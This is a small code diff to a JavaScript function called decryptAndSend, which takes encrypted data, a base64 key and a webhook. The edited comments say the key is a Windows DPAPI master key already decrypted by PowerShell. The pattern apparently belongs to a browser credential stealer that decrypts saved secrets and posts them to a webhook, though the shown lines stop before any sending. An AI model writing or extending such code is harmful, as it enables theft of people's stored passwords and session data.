@@ -28,12 +28,8 @@ async function decryptAndSend(encryptedHex, keyB64, webhook) {
     try {
         console.log('[API] Starting decryption...');
         
-        // Decode encrypted key from base64
+        // Decode the master key from base64 (should be raw 32 bytes after DPAPI decryption in PowerShell)
         const keyData = Uint8Array.from(atob(keyB64), c => c.charCodeAt(0));
-        
-        // Skip first 5 bytes (DPAPI prefix) and decrypt using DPAPI
-        // For browser, we'll just use the key as-is (assuming it's already the master key)
-        // In production, you'd need server-side DPAPI decryption
         
         // Convert encrypted hex to bytes
         const encryptedBytes = new Uint8Array(encryptedHex.length / 2);
